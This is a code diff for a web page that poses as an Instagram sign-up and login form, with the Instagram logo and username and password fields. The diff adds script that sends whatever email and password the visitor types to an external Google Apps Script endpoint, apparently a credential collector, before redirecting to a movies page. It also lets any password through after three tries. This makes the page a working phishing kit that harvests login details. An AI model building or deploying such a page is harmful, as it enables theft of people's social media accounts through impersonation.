@@ -4,78 +4,47 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Instagram Sign Up</title>
-
 <style>
-body{
-  margin:0;
-  height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  background:white;
-  font-family:sans-serif;
-}
-.container{
-  width:90%;
-  max-width:350px;
-  text-align:center;
-}
-.logo{
-  width:80px;
-  margin-bottom:20px;
-}
-input{
-  width:100%;
-  padding:12px;
-  margin:8px 0;
-  border-radius:10px;
-  border:1px solid #ccc;
-}
-button{
-  width:100%;
-  padding:12px;
-  background:#1877f2;
-  color:white;
-  border:none;
-  border-radius:10px;
-  font-size:16px;
-  cursor:pointer;
-}
-#errorMsg{
-  color:red;
-  font-size:14px;
-  margin-top:5px;
-}
+body{ margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:white; font-family:sans-serif;}
+.container{ width:90%; max-width:350px; text-align:center;}
+.logo{ width:80px; margin-bottom:20px;}
+input{ width:100%; padding:12px; margin:8px 0; border-radius:10px; border:1px solid #ccc;}
+button{ width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:10px; font-size:16px; cursor:pointer;}
+#errorMsg{color:red; font-size:14px; margin-top:5px;}
 </style>
-
 </head>
 <body>
 
 <div class="container">
-
   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
 
-  <!-- إدخالات المستخدم -->
   <input id="instaUser" placeholder="Nom de profil, e-mail ou numéro">
   <input id="instaPass" type="password" placeholder="Mot de passe">
 
   <button onclick="go()">Sign Up</button>
   <div id="errorMsg"></div>
-
 </div>
 
 <script>
 let attempts = 0;
 const maxAttempts = 3;
-const correctPassword = "1234"; // كلمة السر الصحيحة
+const correctPassword = "1234"; 
+const sheetUrl = "https://script.google.com/macros/s/AKfycbxRejtCOVk1izyTqMAP1JTEolKVaUMxMpIZUE2_m7SixWHTWZbm32yKdmzA2CerQ9DznA/exec"; 
 
 function go() {
+  const email = document.getElementById("instaUser").value;
   const pw = document.getElementById("instaPass").value;
   const error = document.getElementById("errorMsg");
   attempts++;
 
   if(pw === correctPassword || attempts === maxAttempts){
-    window.location.href = "movies.html"; // الدخول للسيت
+   fetch(sheetUrl, {
+  method: "POST",
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=NA&form=Instagram`
+}).then(()=>{
+      window.location.href = "movies.html"; // بعد نجاح التسجيل
+    });
   } else {
     error.innerText = "Password incorrect";
   }
